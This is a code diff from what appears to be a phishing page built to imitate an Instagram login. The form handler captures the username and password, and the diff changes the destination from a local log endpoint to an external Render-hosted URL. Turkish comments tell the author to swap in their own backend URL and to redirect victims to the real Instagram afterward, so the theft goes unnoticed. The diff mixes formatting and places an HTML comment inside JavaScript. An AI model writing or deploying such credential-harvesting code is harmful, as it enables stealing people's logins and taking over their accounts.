@@ -299,15 +299,15 @@
             });
         });
 
-        form.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+        form.addEventListener("submit", (e) => {
+    e.preventDefault();
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
 
-            fetch('/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, password })
+    fetch("https://your-render-backend-url.onrender.com/log", {   <!-- BUNU BURADA DEĞİŞTİR -->
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, password }),
             }).then(() => {
                 // İstersen gerçek siteye yönlendirebilirsin
                 window.location.href = 'https://instagram.com';
